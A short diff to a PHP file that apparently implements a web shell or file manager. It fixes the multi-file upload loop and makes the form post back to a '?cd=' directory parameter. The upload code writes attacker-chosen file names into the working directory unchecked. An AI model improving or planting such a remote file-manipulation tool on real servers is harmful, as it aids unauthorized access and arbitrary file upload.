@@ -204,7 +204,7 @@ class x {
     public function upload(array $file) {
     	$this->files = count($file['tmp_name']);
     	for ($i=0; $i < $this->files ; $i++) { 
-    		return copy($file['tmp_name'], $this->cwd . $file['name']);
+    		return copy($file['tmp_name'][$i], $this->cwd . $file['name'][$i]);
     	}
     }
     public function size($filename) {
@@ -358,7 +358,7 @@ foreach (scandir(getcwd()) as $key => $value) {
 						<img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icon">
 					</a>
 				</td>
-				<form method="post">
+				<form method="post" action="?cd=<?= getcwd() ?>">
 					<td colspan="4" class="header">
 						<a href="<?= $x->home() ?>">HOME</a>
 						<button name="tools" value="upload">UPLOAD</button>
